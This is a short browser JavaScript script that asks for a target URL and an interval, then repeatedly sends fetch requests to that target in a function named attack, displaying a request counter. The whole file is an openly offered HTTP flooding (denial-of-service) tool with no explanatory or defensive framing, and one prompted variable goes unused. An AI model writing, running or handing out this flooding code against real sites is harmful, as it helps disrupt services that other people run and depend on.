var target = prompt("Enter target url.");
var speed = prompt("Make request ever miliseconds");
var msg = prompt("Message to HTTP server");
var dn = 0
function attack() {  


	
	
	
   dn = dn + 1
   fetch(target);
   document.body.innerHTML = dn;
   

                    
}
setInterval(attack, speed);  
